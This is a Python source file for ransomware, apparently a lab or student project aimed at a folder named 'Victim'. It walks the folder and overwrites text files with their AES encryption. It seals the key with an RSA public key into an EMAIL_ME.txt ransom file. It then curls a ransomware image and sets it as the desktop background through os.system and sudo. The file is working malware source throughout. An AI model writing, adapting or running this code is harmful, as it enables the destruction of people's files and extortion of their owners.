import os
from keyGen import *
from Crypto.Cipher import AES
from Crypto.Cipher import Salsa20
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

class Encrypt:
    def __init__(self):
        self.pubkey = None
        self.symm_key = keyGenSymmetric()[0]
        self.file_extensions = ['txt']
        self.local_root = '/home/ubuntu/Desktop/Victim'
       
    def rsaEncrypt(self, message):

        self.pubkey = RSA.importKey(open('pubKey.pem').read())
        cipher = PKCS1_OAEP.new(self.pubkey)
        enc_message = cipher.encrypt(message)

        # with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa
        with open(r'/home/ubuntu/Desktop/EMAIL_ME.txt', 'wb') as f:  #changed
            f.write(enc_message)

    def aesEncrypt(self, message):
        
        cipher = AES.new(self.symm_key, AES.MODE_EAX)
        cipherText, tag = cipher.encrypt_and_digest(message.encode('utf-8'))

        enc_message = cipher.nonce + tag + cipherText

        return enc_message

    # def salsaEncrypt(self, message):

    #     cipher = Salsa20.new(self.symm_key)
    #     enc_message = cipher.nonce + cipher.encrypt(message.encode())

    #     return enc_message

    def find_files(self):
        system = os.walk(self.local_root, topdown=True)
        print(self.local_root)
        for root, dir, files in system:
            print("root = ",root, "dir = ", dir, "files = ", files)
            for file in files:
                # print(f"Here\n {file}")
                path = os.path.join(root, file)

                if not file.split('.')[-1] in self.file_extensions:
                    continue
                else:
                    self.encrypt_file(path)
                    print(f"[+]{file}")

    
    def encrypt_file(self, file_path):
        with open(file_path, 'r') as f:
            content = f.read()

        enc_content = self.aesEncrypt(content)
        # enc_content = self.salsaEncrypt(content)

        with open(file_path, 'wb') as f:
            f.write(enc_content)

    
    def changeBackground(self):
        cmd1 = 'curl https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg > ransomImage.jpg'
        cmd2 = 'sudo mv ransomImage.jpg /usr/share/backgrounds'
        cmd3 = 'gsettings set org.gnome.desktop.background picture-uri file:////usr/share/backgrounds/ransomImage.jpg'
        os.system(cmd1)
        os.system(cmd2)
        os.system(cmd3)


    def start_ransomware(self):
        print("Starting file encryption....")
        self.find_files()
        self.rsaEncrypt(self.symm_key)
        print("Successfully encrypted all files!\n")
        self.changeBackground()

    

# if __name__ == "__main__":
#     enc = Encrypt()
#     enc.start_ransomware()